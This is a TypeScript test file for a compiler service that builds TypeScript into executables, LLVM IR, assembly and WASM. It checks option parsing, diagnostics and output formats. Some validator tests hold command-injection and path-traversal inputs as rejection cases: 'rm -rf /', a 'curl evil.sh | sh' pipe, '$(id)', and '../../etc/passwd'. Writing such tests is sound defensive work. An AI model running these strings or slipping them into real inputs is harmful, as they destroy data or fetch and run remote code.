import { test } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import {
  MAX_CODE_SIZE,
  isValidProjectPath,
  TEMP_DIR,
  analyzeCoverage,
  compileTypeScript,
  makeSourceFilename,
  parseCompileOptions,
  parseCoverage,
  parseDiagnostics,
  resolveTempPath,
} from '../src/lib/compiler.ts';

const scriptcMissing = (() => {
  try {
    execFileSync(path.join('node_modules', '.bin', 'scriptc'), ['--version'], { stdio: 'ignore' });
    return false;
  } catch {
    return 'scriptc is not installed';
  }
})();

test('parseCompileOptions accepts valid input', () => {
  const result = parseCompileOptions({ code: 'console.log(1)', target: 'asm', platform: 'linux', arch: 'x64' });
  assert.ok(!('error' in result));
  assert.equal(result.target, 'asm');
  assert.equal(result.platform, 'linux');
});

test('parseCompileOptions requires code', () => {
  assert.deepEqual(parseCompileOptions({}), { error: 'Code is required' });
  assert.deepEqual(parseCompileOptions(null), { error: 'Invalid request body' });
  assert.deepEqual(parseCompileOptions({ code: 42 }), { error: 'Code is required' });
});

test('parseCompileOptions rejects values that are not in the allow-list', () => {
  for (const [key, value] of [
    ['target', 'exe; rm -rf /'],
    ['platform', 'linux && curl evil.sh | sh'],
    ['arch', '$(id)'],
    ['optimization', 'O2 --linker /bin/sh'],
  ]) {
    assert.deepEqual(parseCompileOptions({ code: 'x', [key]: value }), { error: `Invalid ${key}` });
  }
});

test('parseCompileOptions rejects oversized code', () => {
  const result = parseCompileOptions({ code: 'a'.repeat(MAX_CODE_SIZE + 1) });
  assert.ok('error' in result);
});

test('makeSourceFilename strips path traversal and shell metacharacters', () => {
  for (const evil of ['../../etc/passwd', 'a; rm -rf ~ #.ts', '$(touch /tmp/pwned).ts', '`id`.ts', 'x\n.ts']) {
    const name = makeSourceFilename(evil);
    assert.match(name, /^[0-9a-f]{32}(-[A-Za-z0-9_-]+)?\.ts$/, `unsafe name for ${JSON.stringify(evil)}: ${name}`);
    assert.ok(resolveTempPath(name), `generated name should resolve: ${name}`);
  }
});

test('makeSourceFilename keeps a readable suffix and is unique', () => {
  const a = makeSourceFilename('my-app.ts');
  const b = makeSourceFilename('my-app.ts');
  assert.match(a, /-my-app\.ts$/);
  assert.notEqual(a, b);
  assert.match(makeSourceFilename(), /^[0-9a-f]{32}\.ts$/);
});

test('resolveTempPath only resolves plain files inside TEMP_DIR', () => {
  assert.equal(resolveTempPath('abc123.wasm'), path.join(TEMP_DIR, 'abc123.wasm'));
  for (const evil of ['../package.json', '..', '.env', 'a/../../b', '/etc/passwd', 'a\\..\\b', 'foo..bar', '', 'a"b']) {
    assert.equal(resolveTempPath(evil), null, `should reject ${JSON.stringify(evil)}`);
  }
});

test('parseCompileOptions maps legacy optimization levels and rejects the removed C target', () => {
  const legacy = parseCompileOptions({ code: 'x', optimization: 'O2' });
  assert.ok(!('error' in legacy) && legacy.optimization === 'release');
  const dev = parseCompileOptions({ code: 'x', optimization: 'dev' });
  assert.ok(!('error' in dev) && dev.optimization === 'dev');
  const c = parseCompileOptions({ code: 'x', target: 'c' });
  assert.ok('error' in c && /removed/.test(c.error));
});

test('parseDiagnostics extracts location, code and hint', () => {
  const output = [
    'app.ts:7:1 - error SC2020: \'eval\' has no scriptc lowering yet',
    '',
    '  7 | eval(\'1+1\');',
    '  hint: runtime code evaluation cannot be compiled ahead of time',
    'app.ts:8:3 - error SC1090: assignment to non-variables are not supported yet',
  ].join('\n');
  assert.deepEqual(parseDiagnostics(output), [
    { file: 'app.ts', line: 7, column: 1, severity: 'error', code: 'SC2020', message: "'eval' has no scriptc lowering yet", hint: 'runtime code evaluation cannot be compiled ahead of time' },
    { file: 'app.ts', line: 8, column: 3, severity: 'error', code: 'SC1090', message: 'assignment to non-variables are not supported yet' },
  ]);
});

test('parseCoverage reads the coverage report', () => {
  const report = `scriptc coverage app.ts

  statements analyzed   8
  compile statically    6  (75%)

  blockers:
      ×1  assignment to non-variables                     SC1090
      ×2  'eval' has no scriptc lowering yet              SC2020
`;
  assert.deepEqual(parseCoverage(report), {
    statements: 8,
    static: 6,
    percent: 75,
    blockers: [
      { count: 1, message: 'assignment to non-variables', code: 'SC1090' },
      { count: 2, message: "'eval' has no scriptc lowering yet", code: 'SC2020' },
    ],
  });
});

test('compileTypeScript builds native, LLVM and assembly output', { skip: scriptcMissing }, async () => {
  const code = 'console.log(`hi ${1 + 1}`);\n';
  const exe = await compileTypeScript({ code, filename: 'hi.ts' });
  assert.equal(exe.success, true, exe.error);
  assert.ok(exe.size && exe.size > 1000);
  assert.match(exe.filename ?? '', /^[0-9a-f]{32}-hi$/);
  assert.equal(execFileSync(path.join(TEMP_DIR, exe.filename!), { encoding: 'utf8' }), 'hi 2\n');

  const llvm = await compileTypeScript({ code, target: 'llvm' });
  assert.equal(llvm.success, true, llvm.error);
  assert.match(llvm.output ?? '', /define /);

  const asm = await compileTypeScript({ code, target: 'asm' });
  assert.equal(asm.success, true, asm.error);
  assert.match(asm.filename ?? '', /\.s$/);
});

test('compileTypeScript reports diagnostics without leaking server paths', { skip: scriptcMissing }, async () => {
  const result = await compileTypeScript({ code: 'const x = 1;\neval("1");\n', filename: 'bad.ts' });
  assert.equal(result.success, false);
  assert.match(result.error ?? '', /^SC2020: .* \(bad\.ts:2\)$/);
  assert.equal(result.diagnostics?.[0]?.file, 'bad.ts');
  assert.equal(result.diagnostics?.[0]?.line, 2);
  assert.ok(!(result.stderr ?? '').includes(TEMP_DIR), 'stderr should not contain the temp directory');
  assert.match(result.stderr ?? '', /bad\.ts:2:1/);
});

test('analyzeCoverage reports static coverage and blockers', { skip: scriptcMissing }, async () => {
  const result = await analyzeCoverage({ code: 'console.log(1);\neval("1");\n' });
  assert.equal(result.success, true, result.error);
  assert.equal(result.statements, 2);
  assert.equal(result.blockers?.[0]?.code, 'SC2020');
});

test('concurrent builds all complete under the concurrency cap', { skip: scriptcMissing }, async () => {
  const results = await Promise.all(
    Array.from({ length: 5 }, (_, i) => compileTypeScript({ code: `console.log(${i});\n`, target: 'llvm' }))
  );
  assert.ok(results.every(r => r.success), results.map(r => r.error).join(', '));
});

test('isValidProjectPath allows nested relative paths only', () => {
  for (const ok of ['main.ts', 'src/main.ts', 'src/lib/format.ts', 'data_1.json', 'a-b/c.d.ts']) {
    assert.ok(isValidProjectPath(ok), ok);
  }
  for (const bad of ['../x.ts', 'src/../../x.ts', '/etc/passwd', '.env', 'src/.git/config', 'a//b.ts', 'a\\b.ts', '', 'a b.ts', 'src/']) {
    assert.equal(isValidProjectPath(bad), false, bad);
  }
});

test('parseCompileOptions validates multi-file projects', () => {
  const ok = parseCompileOptions({ files: { 'src/main.ts': 'x', 'src/a.ts': 'y' }, entry: 'src/main.ts' });
  assert.ok(!('error' in ok) && ok.code === 'x' && ok.entry === 'src/main.ts');
  assert.ok('error' in parseCompileOptions({ files: { '../evil.ts': 'x' }, entry: '../evil.ts' }));
  assert.ok('error' in parseCompileOptions({ files: { 'a.ts': 'x' }, entry: 'b.ts' }));
  assert.ok('error' in parseCompileOptions({ files: { 'a.json': '{}' }, entry: 'a.json' }));
  assert.ok('error' in parseCompileOptions({ files: { 'a.ts': 5 }, entry: 'a.ts' }));
  assert.ok('error' in parseCompileOptions({ files: [], entry: 'a.ts' }));
});

test('compileTypeScript builds a multi-file project with relative imports', { skip: scriptcMissing }, async () => {
  const result = await compileTypeScript({
    code: '',
    entry: 'src/main.ts',
    files: {
      'src/main.ts': "import { greet } from './lib/greet';\nconsole.log(greet('multi'));\n",
      'src/lib/greet.ts': 'export function greet(name: string): string { return `hello ${name}`; }\n',
      'README.md': 'ignored',
    },
  });
  assert.equal(result.success, true, result.error);
  assert.match(result.filename ?? '', /^[0-9a-f]{32}-main$/);
  assert.equal(execFileSync(path.join(TEMP_DIR, result.filename!), { encoding: 'utf8' }), 'hello multi\n');
  assert.deepEqual(result.phases?.map(p => p.name), ['queue', 'write', 'compile', 'package']);
});

test('diagnostics point at the file that failed in a project', { skip: scriptcMissing }, async () => {
  const result = await compileTypeScript({
    code: '',
    entry: 'src/main.ts',
    files: {
      'src/main.ts': "import { run } from './bad';\nrun();\n",
      'src/bad.ts': 'export function run(): void {\n  eval("1");\n}\n',
    },
  });
  assert.equal(result.success, false);
  assert.equal(result.diagnostics?.[0]?.file, 'src/bad.ts');
  assert.equal(result.diagnostics?.[0]?.line, 2);
});

test('withBundledZig appends the bundled zig so a system zig still wins', async () => {
  const { mkdtempSync, mkdirSync, writeFileSync, rmSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const { withBundledZig, bundledZigDir } = await import('../src/lib/zig.ts');
  const root = mkdtempSync(path.join(tmpdir(), 'zig-'));
  try {
    assert.equal(bundledZigDir(root), null);
    const env = { PATH: '/usr/bin' };
    assert.equal(withBundledZig(env, root), env); // nothing installed: untouched

    const bin = path.join(root, 'node_modules', '@zigc', `${process.platform}-${process.arch}`, 'bin');
    mkdirSync(bin, { recursive: true });
    writeFileSync(path.join(bin, process.platform === 'win32' ? 'zig.exe' : 'zig'), '');
    const next = withBundledZig(env, root);
    assert.equal(next.PATH, `/usr/bin${path.delimiter}${bin}`);
    assert.equal(withBundledZig(next, root), next); // not added twice
    assert.equal(withBundledZig({ Path: 'C:\\x' }, root).Path, `C:\\x${path.delimiter}${bin}`); // Windows casing
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Output targets and build options
// ---------------------------------------------------------------------------

const FIB = "function fib(n: number): number { return n < 2 ? n : fib(n - 1) + fib(n - 2); }\nconsole.log(`fib = ${fib(10)}`);\n";
const bytesOf = (output: string | undefined) => Buffer.from(output ?? '', 'base64');

test('parseCompileOptions accepts the new targets and build options, and rejects bad ones', () => {
  for (const target of ['obj', 'ir', 'wat', 'lib', 'reactor']) {
    const parsed = parseCompileOptions({ code: 'x', target, strip: false, sanitize: false, dynamic: true, windowsSubsystem: 'gui' });
    assert.ok(!('error' in parsed), target);
    assert.equal(parsed.dynamic, true);
    assert.equal(parsed.windowsSubsystem, 'gui');
  }
  assert.deepEqual(parseCompileOptions({ code: 'x', strip: 'yes' }), { error: 'strip must be true or false' });
  assert.deepEqual(parseCompileOptions({ code: 'x', sanitize: 1 }), { error: 'sanitize must be true or false' });
  assert.deepEqual(parseCompileOptions({ code: 'x', windowsSubsystem: 'headless' }), { error: 'Invalid windowsSubsystem' });
  assert.deepEqual(parseCompileOptions({ code: 'x', target: 'exe; rm -rf /' }), { error: 'Invalid target' });
});

test('text targets return readable output: LLVM IR, scriptc IR, assembly, WAT', { skip: scriptcMissing }, async () => {
  const llvm = await compileTypeScript({ code: FIB, target: 'llvm' });
  assert.ok(llvm.success, llvm.error);
  assert.equal(llvm.format, 'text');
  assert.match(llvm.output!, /define /);

  const ir = await compileTypeScript({ code: FIB, target: 'ir' });
  assert.ok(ir.success, ir.error);
  assert.match(ir.filename!, /\.ir\.json$/);
  assert.equal(typeof JSON.parse(ir.output!).irVersion, 'number');

  const asm = await compileTypeScript({ code: FIB, target: 'asm' });
  assert.ok(asm.success, asm.error);
  assert.match(asm.output!, /\.text|\.section/);

  const wat = await compileTypeScript({ code: FIB, target: 'wat' });
  assert.ok(wat.success, wat.error);
  assert.equal(wat.format, 'text');
  assert.match(wat.filename!, /\.wat$/);
  assert.match(wat.output!, /^\(module/);
});

test('binary targets return bytes with the right magic: executable, object, WASM', { skip: scriptcMissing }, async () => {
  const exe = await compileTypeScript({ code: FIB, target: 'exe' });
  assert.ok(exe.success, exe.error);
  assert.equal(exe.format, 'binary');
  if (process.platform === 'linux') assert.deepEqual([...bytesOf(exe.output).subarray(0, 4)], [0x7f, 0x45, 0x4c, 0x46]);

  const obj = await compileTypeScript({ code: FIB, target: 'obj' });
  assert.ok(obj.success, obj.error);
  assert.match(obj.filename!, /\.o(bj)?$/);
  assert.ok(bytesOf(obj.output).length > 100);

  const wasm = await compileTypeScript({ code: FIB, target: 'wasm' });
  assert.ok(wasm.success, wasm.error);
  assert.deepEqual([...bytesOf(wasm.output).subarray(0, 4)], [0x00, 0x61, 0x73, 0x6d]);
});

test('strip and optimization change the executable; options that do not apply are ignored', { skip: scriptcMissing }, async () => {
  const stripped = await compileTypeScript({ code: FIB, target: 'exe' });
  const symbols = await compileTypeScript({ code: FIB, target: 'exe', strip: false });
  assert.ok(stripped.success && symbols.success);
  assert.ok(symbols.size! > stripped.size!, 'keeping symbols makes a bigger file');
  // sanitize and windowsSubsystem only apply to native executables
  const wasm = await compileTypeScript({ code: FIB, target: 'wasm', sanitize: true, strip: false, windowsSubsystem: 'gui' });
  assert.ok(wasm.success, wasm.error);
});

const COUNTER = 'declare function changed(value: number): void;\nlet count = 0;\nexport function step(delta: number): number {\n  count += delta;\n  changed(count);\n  return count;\n}\n';
const PROFILE = JSON.stringify({
  profile_format: 1,
  name: 'counter',
  entry: 'counter.ts',
  emission: 'llvm',
  abi: { prefix: 'counter_', init_symbol: 'counter_init', sink_register_symbol: 'counter_sink', callback_register_symbol: 'counter_callback' },
  callbacks: [{ name: 'changed', params: ['f64'], returns: 'void' }],
  exports: [{ export: 'step', symbol: 'counter_step', params: ['f64'], returns: 'f64' }],
});

test('library targets build from scriptc.profile.json: static archive and WASM reactor', { skip: scriptcMissing }, async () => {
  const files = { 'counter.ts': COUNTER, 'scriptc.profile.json': PROFILE };
  const lib = await compileTypeScript({ code: COUNTER, files, entry: 'counter.ts', target: 'lib' });
  assert.ok(lib.success, lib.error);
  assert.match(lib.filename!, /\.(a|lib)$/);
  assert.equal(bytesOf(lib.output).subarray(0, 7).toString(), '!<arch>');

  const reactor = await compileTypeScript({ code: COUNTER, files, entry: 'counter.ts', target: 'reactor' });
  assert.ok(reactor.success, reactor.error);
  assert.deepEqual([...bytesOf(reactor.output).subarray(0, 4)], [0x00, 0x61, 0x73, 0x6d]);

  const missing = await compileTypeScript({ code: COUNTER, target: 'lib' });
  assert.equal(missing.success, false);
  assert.match(missing.error!, /scriptc\.profile\.json/);
});
